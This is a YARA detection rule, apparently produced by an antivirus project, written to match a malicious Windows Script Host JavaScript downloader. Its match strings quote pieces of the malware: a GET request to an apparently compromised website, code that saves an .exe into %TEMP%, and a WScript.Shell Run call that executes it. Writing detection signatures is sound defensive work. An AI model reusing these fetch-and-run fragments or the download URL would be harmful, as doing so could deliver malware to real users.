rule sig_20160329_6311c401b1225a3a2b7e077880fda843 {
  meta:
    description = "datamaliciousorder - file 20160329_6311c401b1225a3a2b7e077880fda843.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b4dc54eed62d61485e77dd30e5d4ce43331c2ce9f346dbfffb9c197bc75d794"

  strings:
    $s1  = "function dl() {return yF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OGm9xdtebOD4gz3J.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[g](pF() * 11); if (Wy[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var yF = function J() {return WScript[O](\"WScript.Shell\");}(), v = 11;" fullword ascii
    $s4  = "Wy[t](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s5  = "function Hl(wW, d){DU = DU * 1; return wW - d;};" fullword ascii
    $s6  = "function D(){return \"\" + l;};" fullword ascii
    $s7  = "function k(hR){yF[\"Run\"](hR, DU, DU);};" fullword ascii
    $s8  = "function e() {return ((ru == true) && (ru == P)) ? 1 : DU;};" fullword ascii
    $s9  = " while (x){" fullword ascii
    $s10 = "function pF(){return 22;};" fullword ascii
    $s11 = "function qT()" fullword ascii
    $s12 = "function U(a) {var qW = (1, 2, 3, 4, 5, a); return qW;};" fullword ascii
    $s13 = "return Hl(r, O0);" fullword ascii
    $s14 = "var R = new this[\"Date\"]();" fullword ascii
    $s15 = "function o(){return O;};" fullword ascii
    $s16 = "var h = false;" fullword ascii
    $s17 = "ru = true; " fullword ascii
    $s18 = "var ru = false;" fullword ascii
    $s19 = "P = true; " fullword ascii
    $s20 = "var P = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}